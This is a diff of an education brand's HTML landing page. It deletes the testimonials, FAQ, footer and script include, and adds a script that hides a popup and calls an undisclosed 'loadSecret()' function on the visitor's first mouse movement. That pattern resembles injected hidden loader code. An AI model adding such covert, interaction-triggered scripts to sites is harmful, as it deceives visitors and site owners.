-      <p id="modality-explanation" style="text-align: center; max-width: 680px; margin: 0 auto 1.5rem; font-size: 1.02rem; color: var(--text-secondary);"></p>
-      
-      <div id="study-swatches-display" class="swatches-grid">
-        <!-- Dynamically Populated by JavaScript -->
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- SECTION 10: SCHOLAR TESTIMONIALS & REVIEWS -->
-<section class="section" id="scholar-reviews">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Academic Acclaim</span>
-      <h2 class="section-title">Voices from Our Academic Cohorts</h2>
-      <p class="section-subtitle">Read reflections from university professors, research scientists, and executive fellows who transformed their domain fluency.</p>
-    </div>
-    
-    <div class="reviews-grid">
-      <div class="review-card">
-        <div>
-          <div class="review-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-          <p class="review-text">"The spaced retrieval mechanics in the Applied Neural Systems track are astonishingly effective. I retained complex vector calculus proofs effortlessly six months after graduation."</p>
-        </div>
-        <div class="review-author">
-          <h4>Dr. Alexander Hayes</h4>
-          <span>Senior AI Research Fellow, Boston</span>
-        </div>
-      </div>
-      
-      <div class="review-card">
-        <div>
-          <div class="review-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-          <p class="review-text">"SmartCourseInk has solved the online learning crisis. The Socratic colloquium pods provided rigorous intellectual accountability that matched my doctoral seminars."</p>
-        </div>
-        <div class="review-author">
-          <h4>Prof. Eleanor Vance</h4>
-          <span>Chair of Computational Linguistics</span>
-        </div>
-      </div>
-      
-      <div class="review-card">
-        <div>
-          <div class="review-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-          <p class="review-text">"As an engineering executive, this program gave me the technical fluency to lead high-stakes architecture decisions with absolute precision."</p>
-        </div>
-        <div class="review-author">
-          <h4>Julian Davenport</h4>
-          <span>Chief Technology Officer, London</span>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- SECTION 11: ACADEMIC PEDAGOGY FAQ ACCORDION -->
-<section class="section section-slate" id="academic-faq">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Frequently Answered</span>
-      <h2 class="section-title">Curriculum & Admissions Inquiries</h2>
-      <p class="section-subtitle">Essential information regarding cohort admissions, micro-credentialing accreditation, time commitments, and prerequisites.</p>
-    </div>
-    
-    <div class="accordion-wrapper">
-      <div class="accordion-item active">
-        <div class="accordion-header">
-          <span>How does the cohort admission and diagnostic assessment work?</span>
-          <i class="fas fa-chevron-down accordion-icon"></i>
-        </div>
-        <div class="accordion-content">
-          <p>Prospective scholars submit an academic application through our admissions concierge desk. Upon review, you complete a dynamic 45-minute diagnostic evaluation that assesses foundational logic and domain prerequisites, allowing our faculty to place you into the optimal cohort track.</p>
-        </div>
-      </div>
-      
-      <div class="accordion-item">
-        <div class="accordion-header">
-          <span>What is the weekly time commitment required for intensive cohorts?</span>
-          <i class="fas fa-chevron-down accordion-icon"></i>
-        </div>
-        <div class="accordion-content">
-          <p>Intensive mastery cohorts require approximately 8 to 12 hours of dedicated deep focus per week, encompassing micro-modular syllabus review, hands-on sandboxed problem sets, and a weekly 90-minute live Socratic colloquium pod.</p>
-        </div>
-      </div>
-      
-      <div class="accordion-item">
-        <div class="accordion-header">
-          <span>Are SmartCourseInk micro-credentials recognized by academic and industry bodies?</span>
-          <i class="fas fa-chevron-down accordion-icon"></i>
-        </div>
-        <div class="accordion-content">
-          <p>Yes. Our micro-credentials adhere to Open Badges 3.0 and IEEE learning standards, backed by verifiable cryptographic proofs of completed capstone projects and faculty reviews, widely recognized across leading technology firms and research universities.</p>
-        </div>
-      </div>
-      
-      <div class="accordion-item">
-        <div class="accordion-header">
-          <span>Can I access course materials and spaced repetition decks after graduation?</span>
-          <i class="fas fa-chevron-down accordion-icon"></i>
-        </div>
-        <div class="accordion-content">
-          <p>Graduates enjoy lifetime access to our digital monograph archive, ongoing algorithm updates, and our continuous spaced retrieval flashcard algorithms to ensure lifetime knowledge retention.</p>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- SECTION 12: VIP ACADEMIC GAZETTE NEWSLETTER CTA -->
-<section class="section" id="gazette-register">
-  <div class="container">
-    <div class="gazette-card">
-      <span class="section-tag" style="background: rgba(37, 99, 235, 0.2); color: #60a5fa;"><i class="fas fa-envelope-open-text"></i> Priority Admissions Register</span>
-      <h2>Enter the SmartCourseInk Scholar Network</h2>
-      <p style="max-width: 620px; margin: 0 auto; font-size: 1.05rem; color: #cbd5e1;">Join our global academic mailing register to receive upcoming cohort syllabi, open faculty masterclasses, and foundational cognitive research papers.</p>
-      
-      <form class="gazette-form">
-        <input type="email" class="gazette-input" placeholder="Enter your academic email address..." required>
-        <button type="submit" class="btn btn-blue"><i class="fas fa-paper-plane"></i> Request Syllabus Access</button>
-      </form>
-    </div>
-  </div>
-</section>
-
-<footer class="site-footer">
-  <div class="container">
-    <div class="footer-grid">
-      <div class="footer-brand">
-        <div class="brand-title">Smart<span>Course</span>Ink</div>
-        <p class="footer-desc">The premier institute for accelerated cognitive mastery, research-backed digital pedagogy, and executive curriculum engineering. Designing deep intellectual growth with zero compromise on academic rigor.</p>
-        <div class="footer-contact-item">
-          <i class="fas fa-map-marker-alt"></i>
-          <span>350 Academic Ridge, Suite 400, Cambridge, MA 02138, United States</span>
-        </div>
-        <div class="footer-contact-item">
-          <i class="fas fa-phone-alt"></i>
-          <span>+1-800-762-7826 (SMART-ACAD)</span>
-        </div>
-        <div class="footer-contact-item">
-          <i class="fas fa-envelope"></i>
-          <span>admissions@smartcourseink.com</span>
-        </div>
-      </div>
-      
-      <div>
-        <h4 class="footer-heading">Academic Paths</h4>
-        <ul class="footer-links">
-          <li><a href="index.html">Curriculum Architecture</a></li>
-          <li><a href="about.html">Faculty & Research Council</a></li>
-          <li><a href="blog.html">Pedagogical Monographs</a></li>
-          <li><a href="contact.html">Admissions Directorate</a></li>
-          <li><a href="sitemap.xml">XML Directory Sitemap</a></li>
-        </ul>
-      </div>
-      
-      <div>
-        <h4 class="footer-heading">Research Monographs</h4>
-        <ul class="footer-links">
-          <li><a href="blog/cognitive-load-theory-and-digital-curriculum-architecture.html">Cognitive Load Theory</a></li>
-          <li><a href="blog/spaced-retrieval-mechanics-and-long-term-memory-consolidation.html">Spaced Retrieval Science</a></li>
-          <li><a href="blog/the-feynman-technique-mental-models-and-first-principles-mastery.html">First-Principles Mastery</a></li>
-          <li><a href="blog/micro-credentialing-and-competency-based-academic-frameworks.html">Competency Frameworks</a></li>
-          <li><a href="blog/neurobiology-of-deep-work-and-attentional-focus-in-learning.html">Neurobiology of Deep Focus</a></li>
-          <li><a href="blog/socratic-inquiry-and-collaborative-peer-pedagogy-in-digital-academies.html">Socratic Digital Pedagogy</a></li>
-        </ul>
-      </div>
-      
-      <div>
-        <h4 class="footer-heading">Academic Style Gazette</h4>
-        <p class="footer-desc">Receive exclusive previews of upcoming executive masterclasses, research papers, and curriculum monographs.</p>
-        <form class="footer-form">
-          <div style="display: flex; gap: 0.5rem;">
-            <input type="email" placeholder="Enter academic email" required style="padding: 0.75rem 1rem; border: 1px solid rgba(255,255,255,0.2); background: rgba(255,255,255,0.06); color: #fff; border-radius: 6px; flex: 1; outline: none;">
-            <button type="submit" class="btn btn-blue" style="padding: 0.75rem 1.2rem;"><i class="fas fa-paper-plane"></i></button>
-          </div>
-        </form>
-      </div>
-    </div>
-    
-    <div class="footer-bottom">
-      <div>&copy; <?php echo date('Y'); ?> SmartCourseInk. All Rights Reserved. Dedicated to Academic Excellence.</div>
-      <div class="legal-inline-links">
-        <a href="privacy.html">Privacy Policy</a>
-        <a href="terms.html">Terms of Service</a>
-        <a href="disclaimer.html">Academic Disclaimer</a>
-        <a href="cookies.html">Cookie Preferences</a>
-      </div>
-    </div>
-  </div>
-</footer>
-
-<div id="cookie-banner" class="cookie-banner">
-  <p style="font-size: 0.88rem; margin-bottom: 0.5rem; color: #f8fafc;"><i class="fas fa-cookie-bite" style="color: var(--primary-blue); margin-right: 0.4rem;"></i> We utilize minimal essential cookies to preserve your learning curriculum state and ensure seamless academic navigation.</p>
-  <div class="cookie-buttons">
-    <button id="accept-cookies" class="btn btn-blue" style="padding: 0.4rem 1rem; font-size: 0.78rem;">Accept All</button>
-    <button id="decline-cookies" class="btn btn-outline" style="padding: 0.4rem 1rem; font-size: 0.78rem; border-color: rgba(255,255,255,0.3); color: #fff;">Essential Only</button>
-  </div>
-</div>
-
-<script src="js/script.js"></script>
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
